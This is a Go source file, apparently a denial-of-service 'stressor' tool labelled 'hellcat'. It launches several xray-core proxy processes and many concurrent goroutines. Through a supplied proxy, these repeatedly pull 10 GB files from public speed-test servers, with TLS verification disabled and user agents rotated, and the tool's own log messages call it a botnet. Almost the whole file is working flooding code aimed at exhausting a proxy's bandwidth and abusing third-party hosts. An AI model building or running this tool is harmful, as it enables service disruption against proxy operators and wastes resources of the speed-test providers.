// [hellcat]
package stressor

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"sync/atomic"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"curl/7.88.1",
	"Wget/1.21",
	"Go-http-client/1.1",
}

var payloads = []string{
	"http://speedtest.tele2.net/10GB.zip",
	"http://speed.hetzner.de/10GB.bin",
	"http://proof.ovh.net/files/10Gb.dat",
	"http://ipv4.download.thinkbroadband.com/10GB.zip",
}

var (
	requests uint64
	errors   uint64
)

func Run(proxyAddr string, threads int, duration int, numXray int) {
	log.Printf("[hellcat] Starting botnet: %d xray-core instances + %d threads (threads per process)", numXray, threads)

	var wg sync.WaitGroup
	stop := make(chan struct{})

	
	if duration > 0 {
		go func() {
			time.Sleep(time.Duration(duration) * time.Second)
			close(stop)
		}()
	}

	
	for i := 0; i < numXray; i++ {
		go startXrayProcess(i)
	}

	
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: func(_ *http.Request) (*url.URL, error) {
				return url.Parse(proxyAddr)
			},
			DialContext: (&net.Dialer{
				Timeout:   10 * time.Second,
				KeepAlive: 10 * time.Second,
			}).DialContext,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   true,
			MaxIdleConns:        0,
			MaxIdleConnsPerHost: 0,
		},
		Timeout: 0,
	}

	
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					runHeavyStream(client)
				}
			}
		}()
	}

	
	go func() {
		for {
			time.Sleep(5 * time.Second)
			succ := atomic.SwapUint64(&requests, 0)
			fail := atomic.SwapUint64(&errors, 0)
			total := succ + fail
			var errRate float64
			if total > 0 {
				errRate = (float64(fail) / float64(total)) * 100
			}
			log.Printf("[hellcat] Stats: %d successful, %d errors (%.1f%%)", succ, fail, errRate)
		}
	}()

	wg.Wait()
}


func runHeavyStream(client *http.Client) {
	var wg sync.WaitGroup
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			downloadOnce(client)
		}()
	}
	wg.Wait()
}


func downloadOnce(client *http.Client) {
	target := payloads[rand.Intn(len(payloads))]
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := client.Do(req)
	if err != nil || resp.Body == nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	defer resp.Body.Close()

	if _, err := io.Copy(io.Discard, resp.Body); err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	atomic.AddUint64(&requests, 1)
}


func startXrayProcess(index int) {
	configFile := filepath.Join(os.TempDir(), fmt.Sprintf("config_xray_%d.json", index))
	cmd := exec.Command("xray", "-c", configFile)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		log.Printf("[hellcat] Failed to start xray [%d]: %v", index, err)
		return
	}
	log.Printf("[hellcat] xray-core started (PID %d) with config %s", cmd.Process.Pid, configFile)
}
